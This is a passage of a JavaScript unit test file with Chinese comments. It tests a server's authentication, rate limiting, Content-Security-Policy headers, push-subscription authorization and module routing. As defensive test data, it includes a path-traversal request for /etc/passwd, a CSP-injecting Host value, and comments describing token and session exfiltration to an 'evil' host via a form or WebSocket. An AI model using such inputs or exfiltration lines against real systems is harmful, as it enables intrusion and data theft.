// tests/unit/server-http.test.mjs —— HTTP 层：鉴权、安全头、静态壳的模块路由
// 覆盖：tokenMatches 的常数时间比较（AUTH-01）· 安全响应头 · 鉴权失败计入共享限速（AUTH-03）
//       · /push/subscribe 的第二因子——bypass 级信任必须与信任表等价放行，两条路径不能分叉
//       · /js/** 子模块路由与 import 改写：每个相对 import 都要带版本号，
//         否则浏览器会拿旧缓存的模块拼新代码，症状是「改了没生效」且无任何报错
import assert from 'node:assert/strict';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { test } from 'node:test';
import {
  configureHttpShell,
  createHttpAuth,
  rewriteAppModuleImports,
  rewriteIndexAssetUrls,
  setSecurityHeaders,
  tokenMatches,
  registerOperationalRoutes,
  injectCfAccessFlag,
} from '../../app/src/server/http.js';
import { createCfAccessStrategy } from '../../app/src/auth/auth-strategy.js';

// 鉴权策略桩：刻意复用**真实的** createCfAccessStrategy 而不手写一个对象字面量 ——
// 「从哪个头取 JWT」是 Cloudflare 侧的外部契约，手写桩会把它复制一份，两边就能各自漂移
// 而测试照样绿（本仓在 git fixture 上栽过同型的跟头）。这里只注入验签与 Host 归属两个决策。
const strategyStub = ({ ownsHost = () => false, verify = async () => {}, isEnabled = () => false } = {}) =>
  createCfAccessStrategy({ init: () => true, isEnabled, ownsHost, verify, env: {} });

// 前端拆到 app/public/js/app/* 后，若只给 logic.js 打 ?v=，connection-sync 等子模块会吃浏览器缓存——
// 手机顶栏「延迟」改文案却不生效就是这个坑。与 e2e mock transport 对齐：所有相对 import + css 都戳版本。
test('rewriteAppModuleImports versions every relative ESM import, not only logic.js', () => {
  const src = [
    "import { createRttMonitor } from './app/connection-sync.js';",
    'import { esc } from "./logic.js";',
    "import { x } from '../logic.js';",
    "export const keep = from('./not-an-import.js');", // 非 import 语法不误伤
  ].join('\n');
  const out = rewriteAppModuleImports(src, 'abc12345');
  assert.match(out, /from '\.\/app\/connection-sync\.js\?v=abc12345'/);
  assert.match(out, /from '\.\/logic\.js\?v=abc12345'/);
  assert.match(out, /from '\.\.\/logic\.js\?v=abc12345'/);
  assert.match(out, /from\('\.\/not-an-import\.js'\)/); // 保持原样
});

test('rewriteIndexAssetUrls versions js and css under /js and /css', () => {
  const html = [
    '<script type="module" src="/js/app.js"></script>',
    '<script src="/js/sw-cleanup.js"></script>',
    '<link rel="stylesheet" href="/css/app.css">',
    '<link rel="icon" href="/icons/icon.svg">',
  ].join('\n');
  const out = rewriteIndexAssetUrls(html, 'deadbeef');
  assert.match(out, /\/js\/app\.js\?v=deadbeef/);
  assert.match(out, /\/js\/sw-cleanup\.js\?v=deadbeef/);
  assert.match(out, /\/css\/app\.css\?v=deadbeef/);
  assert.match(out, /\/icons\/icon\.svg"/); // 图标不进 assetVersion 链
  // 已带 ?v= 的不重复追加
  assert.equal(
    rewriteIndexAssetUrls('/js/app.js?v=old', 'new'),
    '/js/app.js?v=old',
  );
});

// vendor/ 下的库文件被静态服务那端打了 immutable, max-age=31536000（一年）——?v= 是它们唯一的
// 失效手段，此前 rewriteIndexAssetUrls 的正则不认 /vendor/ 前缀，这批文件的引用点从未被戳过版本号。
test('rewriteIndexAssetUrls 同样覆盖 /vendor/（含嵌套子目录），这批文件被 immutable 缓存一年，?v= 是唯一失效手段', () => {
  const html = [
    '<script src="/vendor/purify.min.js"></script>',
    '<link rel="stylesheet" href="/vendor/github-light.min.css">',
    '<script src="/vendor/codemirror/mode-javascript.min.js"></script>', // 嵌套子目录
  ].join('\n');
  const out = rewriteIndexAssetUrls(html, 'deadbeef');
  assert.match(out, /\/vendor\/purify\.min\.js\?v=deadbeef/);
  assert.match(out, /\/vendor\/github-light\.min\.css\?v=deadbeef/);
  assert.match(out, /\/vendor\/codemirror\/mode-javascript\.min\.js\?v=deadbeef/);
});

test('tokenMatches compares exact byte sequences and rejects missing configuration', () => {
  assert.equal(tokenMatches('', 'anything'), false);
  assert.equal(tokenMatches('secret', undefined), false);
  assert.equal(tokenMatches('secret', 'secret'), true);
  assert.equal(tokenMatches('secret', 'Secret'), false);
  assert.equal(tokenMatches('密钥', '密钥'), true);
  assert.equal(tokenMatches('密钥', '密钥x'), false);
});

test('setSecurityHeaders applies the browser security boundary', () => {
  const headers = new Map();
  setSecurityHeaders({ setHeader: (name, value) => headers.set(name, value) });

  assert.match(headers.get('Content-Security-Policy'), /frame-ancestors 'none'/);
  assert.equal(headers.get('X-Frame-Options'), 'DENY');
  assert.equal(headers.get('X-Content-Type-Options'), 'nosniff');
  assert.equal(headers.get('Referrer-Policy'), 'no-referrer');
});

// SEC：form-action 与 base-uri 都【不】回落到 default-src（CSP 规范），不显式声明就是完全无限制。
// 渲染的 LLM 正文经 DOMPurify 后仍可能带 <form action="https://evil/">：script-src 拦不住表单导航、
// connect-src 也拦不住，用户被诱导填进去的 AUTH_TOKEN 会被 POST 到外域。
test('setSecurityHeaders pins form-action and base-uri so injected markup cannot exfiltrate', () => {
  const headers = new Map();
  setSecurityHeaders({ setHeader: (name, value) => headers.set(name, value) });
  const csp = headers.get('Content-Security-Policy');

  assert.match(csp, /form-action 'self'/);
  assert.match(csp, /base-uri 'none'/);
});

// L2（2026-09-17 安全审查）：connect-src 原本是 `'self' ws: wss:`。裸的 scheme 不限主机——
// 只要 CSP 的 script 那一层被突破一次（目前 script-src 'self' 很紧，但这正是纵深要防的那一格），
// 注入的脚本就能 `new WebSocket('wss://evil/')` 把会话内容整段外带，而 connect-src 不拦。
//
// 【为什么按本页 Host 列出来，而不是只写 'self'】CSP3 规范里 'self' 应当覆盖同源的 ws/wss，
// 但 Safari 在这一格上历史有坑，而 iOS PWA 是本产品的主要目标之一 —— 判错的后果是 socket
// 连不上、整个 app 在 iOS 上不可用。显式列出同源的 ws:// 与 wss:// 不依赖那条规范细节，
// 收紧程度完全一样（列的就是本页自己的源）。
test.describe('setSecurityHeaders: connect-src 收紧到同源（L2）', () => {
  const cspFor = (host) => {
    const headers = new Map();
    setSecurityHeaders({ setHeader: (n, v) => headers.set(n, v) }, host);
    return headers.get('Content-Security-Policy');
  };

  test('带 Host 时列出同源的 ws/wss，且不留裸 scheme', () => {
    const csp = cspFor('ccm.example.com');
    assert.match(csp, /connect-src 'self' ws:\/\/ccm\.example\.com wss:\/\/ccm\.example\.com/);
    // ★ 这条是本次改动的全部意义所在：裸 `ws:` / `wss:` 不限主机
    assert.doesNotMatch(csp, /connect-src[^;]*\sws:\s/, '不得留下不限主机的裸 ws:');
    assert.doesNotMatch(csp, /connect-src[^;]*\swss:\s/, '不得留下不限主机的裸 wss:');
  });

  test('带端口的 Host 原样保留（局域网走 http://ip:3000，端口是源的一部分）', () => {
    assert.match(cspFor('192.168.1.9:3000'),
      /connect-src 'self' ws:\/\/192\.168\.1\.9:3000 wss:\/\/192\.168\.1\.9:3000/);
  });

  // 没有 Host 头就没有「同源」可列。回落到 'self' 而不是回落到裸 scheme：
  // 失败方向是更严，不是更松。
  test('没有 Host 时只留 self（失败方向是更严）', () => {
    for (const h of [undefined, null, '']) {
      const csp = cspFor(h);
      assert.match(csp, /connect-src 'self'(;|$)/);
      assert.doesNotMatch(csp, /ws:/, '取不到 Host 时不得回落成裸 scheme');
    }
  });

  // Host 是客户端可控的。值里带分号/空格/引号就能往 CSP 里塞别的指令——只害到他自己那一个
  // 响应，但没有理由让一个畸形输入改写策略结构。形状不对就当没有。
  test('畸形 Host 不得注入 CSP 指令，按「没有 Host」处理', () => {
    for (const bad of ['evil; script-src *', 'a b', 'has"quote', 'has\'quote', '../x']) {
      const csp = cspFor(bad);
      assert.match(csp, /connect-src 'self'(;|$)/, `${JSON.stringify(bad)} 应被当成没有 Host`);
      assert.doesNotMatch(csp, /script-src \*/, 'CSP 指令被注入了');
    }
  });

  test('其余指令不受影响（改一处不该动到别处）', () => {
    const csp = cspFor('ccm.example.com');
    for (const d of [/default-src 'self'/, /script-src 'self'/, /frame-ancestors 'none'/,
      /form-action 'self'/, /base-uri 'none'/, /img-src 'self' data:/]) {
      assert.match(csp, d);
    }
  });
});

test('createHttpAuth uses Access JWT for public hosts and token fallback for local requests', async () => {
  const verified = [];
  const auth = createHttpAuth({
    authToken: 'secret',
    strategy: strategyStub({
      ownsHost: host => host === 'public.example',
      verify: async token => verified.push(token),
    }),
  });

  const run = async req => {
    const response = { statusCode: 200, body: null, headers: new Map() };
    const res = {
      status(code) { response.statusCode = code; return this; },
      json(body) { response.body = body; return this; },
      setHeader(k, v) { response.headers.set(k, v); return this; },
    };
    let nextCalled = false;
    await auth(req, res, () => { nextCalled = true; });
    return { ...response, nextCalled };
  };

  assert.equal((await run({ headers: { host: 'localhost', 'x-auth-token': 'secret' }, query: {} })).nextCalled, true);
  assert.equal((await run({ headers: { host: 'localhost' }, query: {} })).statusCode, 401);
  assert.equal((await run({ headers: { host: 'public.example', 'cf-access-jwt-assertion': 'jwt' }, query: { token: 'secret' } })).nextCalled, true);
  assert.deepEqual(verified, ['jwt']);
});

// AUTH-03：HTTP 鉴权失败计入共享限速，达阈值 → 429
test('createHttpAuth rateLimit：连续失败锁定 → 429（AUTH-03）', async () => {
  const states = new Map();
  let locked = 0;
  let now = 1_000_000;
  const { onAuthResult } = await import('../../app/src/auth/rate-limiter.js');
  const auth = createHttpAuth({
    authToken: 'secret',
    strategy: strategyStub(),
    rateLimit: {
      active: true,
      sourceKey: () => 'ip:9.9.9.9',
      getState: (k) => states.get(k),
      setState: (k, st) => { states.set(k, st); },
      onResult: onAuthResult,
      now: () => now,
      onLocked: () => { locked++; },
    },
  });
  const run = async () => {
    const response = { statusCode: 200, body: null, headers: new Map() };
    const res = {
      status(code) { response.statusCode = code; return this; },
      json(body) { response.body = body; return this; },
      setHeader(k, v) { response.headers.set(k, v); return this; },
    };
    let nextCalled = false;
    await auth({ headers: { host: 'lan' }, query: {}, socket: { remoteAddress: '9.9.9.9' } }, res, () => { nextCalled = true; });
    return { ...response, nextCalled };
  };
  // threshold=8：每次失败后跳过 backoff 再试
  for (let i = 0; i < 8; i++) {
    const r = await run();
    assert.equal(r.nextCalled, false);
    // 前 7 次 401，第 8 次 locked → 429
    if (i < 7) {
      assert.equal(r.statusCode, 401, `fail ${i + 1} → 401`);
      const st = states.get('ip:9.9.9.9');
      now = (st?.lockUntil || now) + 1;
    } else {
      assert.equal(r.statusCode, 429, '第 8 次失败应 429 rate_limited');
      assert.equal(r.body?.status, 'rate_limited');
    }
  }
  assert.equal(locked, 1);
});

// 退避冷却期内的请求必须回 401 unauthorized，不能回 429 rate_limited（见 rate-limiter.js gateCheck）。
// HTTP 侧与 socket 握手共用同一个限速桶，所以本机随便一个脚本用错令牌打一次 /health，
// 就会把浏览器的 socket 握手一起拖进这把 500ms 短锁——那时说「登录尝试过多」同样是在说反话。
test('createHttpAuth：退避冷却期内 → 401 unauthorized，不是 429 rate_limited', async () => {
  const states = new Map();
  let now = 1_000_000;
  const { onAuthResult } = await import('../../app/src/auth/rate-limiter.js');
  const mkAuth = () => createHttpAuth({
    authToken: 'secret',
    strategy: strategyStub(),
    rateLimit: {
      active: true,
      sourceKey: () => 'ip:127.0.0.1',
      getState: (k) => states.get(k),
      setState: (k, st) => { states.set(k, st); },
      onResult: onAuthResult,
      now: () => now,
    },
  });
  const run = async () => {
    const response = { statusCode: 200, body: null, headers: new Map() };
    const res = {
      status(code) { response.statusCode = code; return this; },
      json(body) { response.body = body; return this; },
      setHeader(k, v) { response.headers.set(k, v); return this; },
    };
    await mkAuth()({ headers: { host: 'localhost' }, query: {}, socket: { remoteAddress: '127.0.0.1' } }, res, () => {});
    return response;
  };
  const first = await run();                       // 失败 #1：真校验了令牌 → 401 + 上 500ms 退避锁
  assert.equal(first.statusCode, 401);
  now += 235;                                      // 生产实测的 235ms（pageshow → 200ms 重连）
  const second = await run();                      // 撞进退避锁：没校验令牌，但也不是「尝试过多」
  assert.equal(second.statusCode, 401, '只错一次，不得升级成 429');
  assert.equal(second.body?.status, 'unauthorized');
  assert.equal(second.headers.get('Retry-After'), undefined, 'unauthorized 不带 Retry-After');
  assert.equal(states.get('ip:127.0.0.1').failCount, 1, '冷却期内不计数');
});

// 2026-09-02：HTTP 侧此前只在「达阈值锁定」那一刻打一行日志，逐次失败连打的哪个端点都不记。
// 审计里那条 `ip:127.0.0.1 锁 900s（via:http）`，前后 10 分钟日志全空白——事后完全无法归因
// 是谁在打。socket 侧每次失败都有 [conn] 日志，两侧不对称。
test('createHttpAuth：每次鉴权失败都经 onAuthFailure 上报，且绝不带出令牌值', async () => {
  const seen = [];
  const auth = createHttpAuth({
    authToken: 'secret',
    strategy: strategyStub(),
    onAuthFailure: (info) => seen.push(info),
  });
  const res = { status() { return this; }, json() { return this; }, setHeader() { return this; } };
  await auth({ headers: { host: 'localhost' }, query: { token: 'wrong-token-value' }, path: '/health' }, res, () => {});
  await auth({ headers: { host: 'localhost' }, query: {}, path: '/metrics' }, res, () => {});

  assert.equal(seen.length, 2, '两次失败都要能被看见');
  assert.equal(seen[0].path, '/health');
  assert.equal(seen[0].reason, 'bad_token', '带了令牌但不匹配');
  assert.equal(seen[1].path, '/metrics');
  assert.equal(seen[1].reason, 'no_token', '压根没带令牌——与「带错了」是不同的排查方向');
  const dumped = JSON.stringify(seen);
  assert.doesNotMatch(dumped, /wrong-token-value|secret/, '日志载荷里不得出现任何令牌值');
});

// 2026-08-06 R6：try 不得把 next() 圈进去。下游 handler（/metrics 聚合、/push/subscribe 解析等）
// 的同步抛错不是鉴权失败——圈进 catch 会给【已通过鉴权】的来源计一次失败（连续 8 次即 15min 锁定，
// 用户被自家某个 handler 的 bug 锁在门外），且在响应可能已写出后二次 res.status(401)。
test('createHttpAuth：下游 handler 抛错不计鉴权失败、不二次写响应、异常向外传播', async () => {
  const states = new Map();
  const onResultCalls = [];
  let now = 3_000_000;
  const { onAuthResult } = await import('../../app/src/auth/rate-limiter.js');
  const auth = createHttpAuth({
    authToken: 'secret',
    strategy: strategyStub(),
    rateLimit: {
      active: true,
      sourceKey: () => 'ip:7.7.7.7',
      getState: (k) => states.get(k),
      setState: (k, st) => { states.set(k, st); },
      onResult: (st, ok, ts) => { onResultCalls.push(ok); return onAuthResult(st, ok, ts); },
      now: () => now,
    },
  });
  const statusCalls = [];
  const res = {
    status(code) { statusCalls.push(code); return this; },
    json() { return this; },
    setHeader() { return this; },
  };
  const req = { headers: { host: 'lan' }, query: { token: 'secret' }, socket: { remoteAddress: '7.7.7.7' } };
  // 下游同步抛错必须向外传播（交给 Express 错误处理），而不是被当鉴权失败吞掉
  await assert.rejects(
    auth(req, res, () => { throw new Error('downstream boom'); }),
    /downstream boom/,
  );
  assert.deepEqual(onResultCalls, [true], '只该有鉴权成功那一次计数，绝不能出现 ok=false');
  assert.equal((states.get('ip:7.7.7.7')?.failCount ?? 0), 0, '失败计数必须为 0——否则 8 个下游 bug 就把用户锁 15 分钟');
  assert.deepEqual(statusCalls, [], '下游抛错后不得二次写响应（401/429 都不行）');
});

// AUTH-NEW-1：active 可为 (req)=>boolean；无 AUTH_TOKEN 但公网 Host 仍须对 JWT 失败限速
test('createHttpAuth rateLimit：active(req) 公网 Host 无 token 仍计入失败（AUTH-NEW-1）', async () => {
  const states = new Map();
  let now = 2_000_000;
  const { onAuthResult } = await import('../../app/src/auth/rate-limiter.js');
  const auth = createHttpAuth({
    authToken: '', // 无 AUTH_TOKEN
    strategy: strategyStub({
      ownsHost: (h) => h === 'app.example.com',
      verify: async () => { throw new Error('bad jwt'); },
    }),
    rateLimit: {
      active: (req) => !!(req?.headers?.host === 'app.example.com'),
      sourceKey: () => 'ip:cf',
      getState: (k) => states.get(k),
      setState: (k, st) => { states.set(k, st); },
      onResult: onAuthResult,
      now: () => now,
    },
  });
  const run = async () => {
    const response = { statusCode: 200, body: null, headers: new Map() };
    const res = {
      status(code) { response.statusCode = code; return this; },
      json(body) { response.body = body; return this; },
      setHeader(k, v) { response.headers.set(k, v); return this; },
    };
    await auth({ headers: { host: 'app.example.com' }, query: {}, socket: {} }, res, () => {});
    return response;
  };
  for (let i = 0; i < 8; i++) {
    const r = await run();
    if (i < 7) {
      assert.equal(r.statusCode, 401, `public JWT fail ${i + 1} → 401`);
      const st = states.get('ip:cf');
      now = (st?.lockUntil || now) + 1;
    } else {
      assert.equal(r.statusCode, 429, '公网无 AUTH_TOKEN 第 8 次 JWT 失败应 429');
    }
  }
  // 本机 Host + active(req)=false 不应累加同一桶
  states.clear();
  now = 3_000_000;
  const lanRes = { statusCode: 200, body: null, headers: new Map(),
    status(c) { this.statusCode = c; return this; },
    json(b) { this.body = b; return this; },
    setHeader() { return this; },
  };
  // active 对 lan host 为 false → 不限速；无 token 本机放行
  await auth({ headers: { host: '127.0.0.1' }, query: {}, socket: {} }, lanRes, () => {});
  assert.equal(states.size, 0, '非公网且 active(req)=false 不写限速状态');
});

// A1 的「仅已批准设备可登记推送」在 bypass 拓扑下是 fail-closed 用错了地方：socket 侧 io.use 对
// 「CF Access 已验」与「真本机直连」走 bypass 分支，而那条分支【不调 addPendingDevice】——这类设备
// 结构上永远进不了待审列表；approveDevice 的三个入口又都要求先在待审列表里，用户在 UI/CLI 上看不到它、
// 无从批准。于是只从公网装 PWA 的手机（deployment.md 主推拓扑）POST /push/subscribe 恒 403，
// 前端只把 'HTTP 403' 写进日志、按钮无提示 —— 推送在旗舰拓扑下静默失效。
test.describe('/push/subscribe 的第二因子：bypass 级信任必须与信任表等价放行', () => {
  function mount({ isDeviceTrusted, bypassDeviceApproval }) {
    const routes = new Map();
    const app = {
      get: (p, ...h) => routes.set(`GET ${p}`, h),
      post: (p, ...h) => routes.set(`POST ${p}`, h),
    };
    const saved = [];
    registerOperationalRoutes({
      app,
      httpAuth: (_req, _res, next) => next(),
      getHealth: () => ({}),
      getMetrics: () => ({}),
      push: {
        enabled: true,
        publicKey: 'k',
        isValidSubscription: () => true,
        saveSubscription: sub => saved.push(sub),
      },
      isDeviceTrusted,
      bypassDeviceApproval,
    });
    const handlers = routes.get('POST /push/subscribe');
    const run = () => {
      const req = {
        body: { endpoint: 'https://push.example/a', keys: { p256dh: 'a', auth: 'b' } },
        get: () => '',
        headers: {},
      };
      const out = { status: 200, payload: null };
      const res = {
        status(c) { out.status = c; return this; },
        json(p) { out.payload = p; return this; },
      };
      handlers[handlers.length - 1](req, res);
      return out;
    };
    return { run, saved };
  }

  test('CF Access / 本机直连（bypass=true）即使不在信任表里也能订阅', () => {
    const { run, saved } = mount({ isDeviceTrusted: () => false, bypassDeviceApproval: () => true });
    const out = run();
    assert.equal(out.status, 200, `不应 403，实际 ${out.status} ${JSON.stringify(out.payload)}`);
    assert.equal(saved.length, 1, '订阅必须落盘');
  });

  test('既不在信任表、也不是 bypass → 仍然 403（第二因子不被削弱）', () => {
    const { run, saved } = mount({ isDeviceTrusted: () => false, bypassDeviceApproval: () => false });
    const out = run();
    assert.equal(out.status, 403);
    assert.equal(saved.length, 0);
  });

  test('在信任表里 → 照常放行（原有行为不变）', () => {
    const { run, saved } = mount({ isDeviceTrusted: () => true, bypassDeviceApproval: () => false });
    assert.equal(run().status, 200);
    assert.equal(saved.length, 1);
  });
});

// 退订是「从收件人名单里移除自己」。此前压根没有这条路由：订上之后服务端那条 endpoint 只能等
// 下一次推送收 410 才被动清掉，而浏览器侧一旦 unsubscribe()，那次推送根本不会再发生 —— 残留可以
// 永久留在 push-subscription.json 里。
// 第二因子与 /push/subscribe 【同门】：同一份名单的增与删走同一道判据。只删 body 里点名的那条
// endpoint，绝不清空全表 —— 手机退订不该顺手把 iPad 的订阅也掐了。
test.describe('/push/unsubscribe：退订必须真的能退', () => {
  function mount({ isDeviceTrusted = () => true, bypassDeviceApproval = () => false, enabled = true } = {}) {
    const routes = new Map();
    const app = {
      get: (p, ...h) => routes.set(`GET ${p}`, h),
      post: (p, ...h) => routes.set(`POST ${p}`, h),
    };
    const removed = [];
    registerOperationalRoutes({
      app,
      httpAuth: (_req, _res, next) => next(),
      getHealth: () => ({}),
      getMetrics: () => ({}),
      push: {
        enabled,
        publicKey: 'k',
        isValidSubscription: () => true,
        saveSubscription: () => {},
        removeSubscription: endpoint => { removed.push(endpoint); return true; },
      },
      isDeviceTrusted,
      bypassDeviceApproval,
    });
    const handlers = routes.get('POST /push/unsubscribe');
    const run = (body = { endpoint: 'https://push.example/a' }) => {
      const req = { body, get: () => '', headers: {} };
      const out = { status: 200, payload: null };
      const res = {
        status(c) { out.status = c; return this; },
        json(p) { out.payload = p; return this; },
      };
      handlers[handlers.length - 1](req, res);
      return out;
    };
    return { run, removed, mounted: !!handlers };
  }

  test('受信设备带 endpoint → 200，且服务端真的把那条删了', () => {
    const { run, removed, mounted } = mount();
    assert.ok(mounted, '路由必须挂上，否则前端退订永远 404');
    const out = run();
    assert.equal(out.status, 200, `实际 ${out.status} ${JSON.stringify(out.payload)}`);
    assert.deepEqual(removed, ['https://push.example/a']);
  });

  test('既不在信任表、也不是 bypass → 403（增删同门，不因为是「降权操作」就松一道）', () => {
    const { run, removed } = mount({ isDeviceTrusted: () => false, bypassDeviceApproval: () => false });
    assert.equal(run().status, 403);
    assert.deepEqual(removed, []);
  });

  test('没给 endpoint → 400，不得当成「清空全部」', () => {
    const { run, removed } = mount();
    assert.equal(run({}).status, 400);
    assert.deepEqual(removed, []);
  });
});

// /js/** 子模块路由：源码在启动时读完并做完 ?v= 改写，请求期只查表。
// 每请求 readFileSync 是同步阻塞事件循环的磁盘访问，而这条路由在鉴权之前（静态资源必须登录前可取），
// 与同文件里 indexHtml/appJs 的启动预读也不一致。「改了 js 要重启」不是新约束——assetVersion 本就是
// 启动时哈希算的，不重启 ?v= 也不换。
test.describe('configureHttpShell 的 /js/** 子模块路由', () => {
  const roots = [];
  test.after(() => { for (const dir of roots) rmSync(dir, { recursive: true, force: true }); });

  function mount(options = {}) {
    const root = mkdtempSync(join(tmpdir(), 'ccm-http-shell-'));
    roots.push(root);
    mkdirSync(join(root, 'app/public/js/app'), { recursive: true });
    writeFileSync(join(root, 'app/public/index.html'), '<body ><script src="/js/app.js"></script></body>');
    writeFileSync(join(root, 'app/public/js/app.js'), "import './app/sub.js';\n");
    writeFileSync(
      join(root, 'app/public/js/app/sub.js'),
      "import { esc } from '../logic.js';\nexport const BUILD = 'startup';\n",
    );

    const routes = new Map();
    const disabled = [];
    const app = { use: () => {}, get: (p, ...h) => routes.set(String(p), h), disable: (k) => disabled.push(k) };
    configureHttpShell({ app, projectRoot: root, strategy: strategyStub(), ...options });

    const handlers = routes.get(String(/^\/js\/.+\.js$/i));
    assert.ok(handlers, '未注册 /js/** 子模块路由');
    const run = path => {
      const out = { status: 200, body: null, headers: new Map(), nextCalled: false };
      const res = {
        status(c) { out.status = c; return this; },
        setHeader(k, v) { out.headers.set(k, v); return this; },
        type() { return this; },
        send(b) { out.body = b; return this; },
        end() { return this; },
      };
      handlers[handlers.length - 1]({ path }, res, () => { out.nextCalled = true; });
      return out;
    };
    // 按注册键直接打某条专用路由（/js/app.js、index）——run() 只走 /js/** 那条正则路由。
    const invoke = (routeKey, path) => {
      const hs = routes.get(routeKey);
      assert.ok(hs, `未注册路由 ${routeKey}`);
      const out = { status: 200, body: null, headers: new Map(), nextCalled: false };
      const res = {
        status(c) { out.status = c; return this; },
        setHeader(k, v) { out.headers.set(k, v); return this; },
        type() { return this; },
        send(b) { out.body = b; return this; },
        end() { return this; },
      };
      hs[hs.length - 1]({ path }, res, () => { out.nextCalled = true; });
      return out;
    };
    return { root, run, invoke, disabled };
  }

  // 生产档显式传 hotReloadJs:false —— 默认值读的是 process.env.ASSET_HOT_RELOAD，
  // 让断言依赖跑测试那台机器的环境变量，就是在制造只有某些机器才红的用例。
  test('请求期零磁盘访问：启动后改盘，路由仍发启动时那份（且相对 import 已戳版本）', () => {
    const { root, run } = mount({ hotReloadJs: false });
    writeFileSync(join(root, 'app/public/js/app/sub.js'), "export const BUILD = 'mutated-after-boot';\n");

    const out = run('/js/app/sub.js');
    assert.equal(out.status, 200);
    assert.match(out.body, /BUILD = 'startup'/);
    assert.doesNotMatch(out.body, /mutated-after-boot/, '请求期又去读盘了');
    assert.match(out.body, /from '\.\.\/logic\.js\?v=[0-9a-f]{8}'/);
    assert.equal(out.headers.get('Cache-Control'), 'no-cache');
  });

  test('路径穿越照旧 400（显式防线不因查表而失效）', () => {
    const out = mount().run('/js/../../etc/passwd.js');
    assert.equal(out.status, 400);
    assert.equal(out.nextCalled, false);
  });

  test('表里没有的子模块交给 static 去 404', () => {
    const out = mount().run('/js/never-existed.js');
    assert.equal(out.nextCalled, true);
    assert.equal(out.body, null);
  });

  test('/js/app.js 让给上面的专用路由', () => {
    assert.equal(mount().run('/js/app.js').nextCalled, true);
  });

  // CodeQL js/case-sensitive-middleware-path：Express 字符串路径默认大小写不敏感，
  // 正则默认敏感。不带 i 时 /JS/app/sub.js 绕过改写落到 static，在大小写不敏感的
  // 文件系统上发出未戳 ?v= 的源码（模块双实例）。
  test('大小写折叠的 /JS/**.js 仍走改写路由，不落到 static', () => {
    const { run } = mount({ hotReloadJs: false });
    for (const path of ['/JS/app/sub.js', '/js/APP/SUB.JS', '/Js/App/Sub.JS']) {
      const out = run(path);
      assert.equal(out.nextCalled, false, `${path} 落到了 static`);
      assert.equal(out.status, 200, path);
      assert.match(out.body, /BUILD = 'startup'/);
      assert.match(out.body, /from '\.\.\/logic\.js\?v=[0-9a-f]{8}'/);
    }
  });

  test('大小写折叠的 /JS/APP.JS 仍让给专用路由', () => {
    assert.equal(mount().run('/JS/APP.JS').nextCalled, true);
  });

  // ★ 2026-08-04 code review：ASSET_HOT_RELOAD=1 只接了 /js/** 子模块那条路由，
  // /js/app.js（约 7000 行、前端改动的主要落点）与 index.html 仍发启动时那份 —— 开发者按
  // .env.example 打开开关、改 app.js、刷新，拿到的是旧代码；而唯一会提示「改前端需重启」的
  // 启动横幅恰恰关在 if (!hotReloadJs) 里，热读模式下什么都不打印，没有任何线索能解释陈旧。
  test('hotReloadJs：/js/app.js 也必须热读（它是前端改动的主要落点）', () => {
    const { root, invoke } = mount({ hotReloadJs: true });
    writeFileSync(join(root, 'app/public/js/app.js'), "import { BUILD } from './app/sub.js';\nexport const MAIN = 'edited-after-boot';\n");
    const out = invoke('/js/app.js', '/js/app.js');
    assert.equal(out.status, 200);
    assert.match(out.body, /edited-after-boot/, '开着热读却发启动快照 = 开关名不副实');
    assert.match(out.body, /from '\.\/app\/sub\.js\?v=[0-9a-f]{8}'/, '热读路径同样要戳版本');
  });

  test('hotReloadJs：index.html 也热读', () => {
    const { root, invoke } = mount({ hotReloadJs: true });
    writeFileSync(join(root, 'app/public/index.html'), '<body ><!--edited-after-boot--><script src="/js/app.js"></script></body>');
    const out = invoke('/,/index.html', '/');
    assert.match(out.body, /edited-after-boot/);
  });

  test('生产档（hotReloadJs:false）仍是启动快照，不因热读改造回退成逐请求读盘', () => {
    const { root, invoke } = mount({ hotReloadJs: false });
    writeFileSync(join(root, 'app/public/js/app.js'), "export const MAIN = 'mutated-after-boot';\n");
    const out = invoke('/js/app.js', '/js/app.js');
    assert.doesNotMatch(out.body, /mutated-after-boot/, '生产档请求期不该读盘');
  });

  // 开发期必须能改完就刷新看到。启动预读是 2026-08-02 为"请求期零磁盘访问"加的，但它把
  // app/public/js 下【除 app.js 外的全部子模块】从"逐请求读盘"变成了启动冻结（index.html 与
  // app.js 本来就是启动读的，子模块不是）。而 `npm run dev` 的 node --watch 只监视被 import
  // 的模块，app/public/js/** 不在服务端的 import 图里 → 改完刷新拿到的还是旧代码、且零提示。
  test('hotReloadJs：开发期逐请求读盘，改完刷新即生效（且相对 import 照样戳版本）', () => {
    const { root, run } = mount({ hotReloadJs: true });
    writeFileSync(
      join(root, 'app/public/js/app/sub.js'),
      "import { esc } from '../logic.js';\nexport const BUILD = 'edited-after-boot';\n",
    );

    const out = run('/js/app/sub.js');
    assert.equal(out.status, 200);
    assert.match(out.body, /BUILD = 'edited-after-boot'/, '开发期还在发启动时那份');
    assert.match(out.body, /from '\.\.\/logic\.js\?v=[0-9a-f]{8}'/, '热读路径漏了 ?v= 改写会造出双实例');
  });

  test('hotReloadJs：启动后新建的子模块也能取到（生产走表、这里走盘）', () => {
    const { root, run } = mount({ hotReloadJs: true });
    writeFileSync(join(root, 'app/public/js/app/born-later.js'), "export const N = 1;\n");

    const out = run('/js/app/born-later.js');
    assert.equal(out.status, 200);
    assert.match(out.body, /export const N = 1/);
    assert.equal(out.nextCalled, false);
  });

  test('hotReloadJs：读不到仍旧交给 static，不把异常抛进请求链', () => {
    assert.equal(mount({ hotReloadJs: true }).run('/js/never-existed.js').nextCalled, true);
  });

  // 判据必须是专用开关，不能是 DEV_MODE：真实生产 .env 里 DEV_MODE=1（.env.example 明确说
  // dogfooding 常驻部署可以开），复用它等于在生产把启动预读悄悄撤回去。
  test('默认档跟随 ASSET_HOT_RELOAD，且不受 DEV_MODE 影响', () => {
    const saved = { hot: process.env.ASSET_HOT_RELOAD, dev: process.env.DEV_MODE };
    const bodyOf = () => {
      const { root, run } = mount(); // 不传 hotReloadJs → 走默认推导
      writeFileSync(join(root, 'app/public/js/app/sub.js'), "export const BUILD = 'edited-after-boot';\n");
      return run('/js/app/sub.js').body;
    };
    try {
      process.env.DEV_MODE = '1';
      delete process.env.ASSET_HOT_RELOAD;
      assert.match(bodyOf(), /BUILD = 'startup'/, 'DEV_MODE 不该打开静态资源热读');

      process.env.ASSET_HOT_RELOAD = '1';
      assert.match(bodyOf(), /BUILD = 'edited-after-boot'/, 'ASSET_HOT_RELOAD=1 应打开热读');
    } finally {
